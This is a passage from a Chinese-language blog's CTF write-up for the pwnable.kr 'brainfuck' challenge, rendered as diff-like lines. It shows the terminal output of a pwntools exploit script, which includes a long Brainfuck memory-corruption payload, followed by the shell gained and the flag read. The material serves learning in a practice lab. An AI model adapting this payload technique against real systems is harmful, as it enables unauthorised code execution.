+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">brainfuck@ubuntu:/tmp/brainfuck_test$ python3 get_flag.py</span><br><span class="line">[+] Opening connection to 0.0.0.0 on port 9001: Done</span><br><span class="line">[*] &#x27;/home/brainfuck/brainfuck&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine</span><br><span class="line">[*] &#x27;/home/brainfuck/libc-2.23.so&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">/tmp/brainfuck_test/get_flag.py:36: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  print(target.recvuntil(&#x27;except [ ]\n&#x27;))</span><br><span class="line">b&#x27;welcome to brainfuck testing system!!\ntype some brainfuck instructions except [ ]\n&#x27;</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;..&gt;.&gt;.&gt;.&lt;&lt;&lt;,&gt;,&gt;,&gt;,&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,&gt;,&gt;,&gt;,&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,&gt;,&gt;,&gt;,.</span><br><span class="line">/tmp/brainfuck_test/get_flag.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  target.sendline(input)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">welcome to brainfuck testing system!!</span><br><span class="line">type some brainfuck instructions except [ ]</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">brainfuck_pwn</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> brainfuck_pwn</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">brainfuck</span><br><span class="line">flag</span><br><span class="line">super.pl</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> flag</span></span><br><span class="line">bR41n_F4ck_Is_FuN_LanguaG3</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://pwnable.kr/">pwnable.kr</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/cybersecurity/BugResearch/D-Link/DIR-645/D-Link_DIR-645_A1_1_03B11_%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/" rel="prev" title="D-Link DIR-645 A1 1.03B11 固件分析">
+                  <i class="fa fa-angle-left"></i> D-Link DIR-645 A1 1.03B11 固件分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Voxzz</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
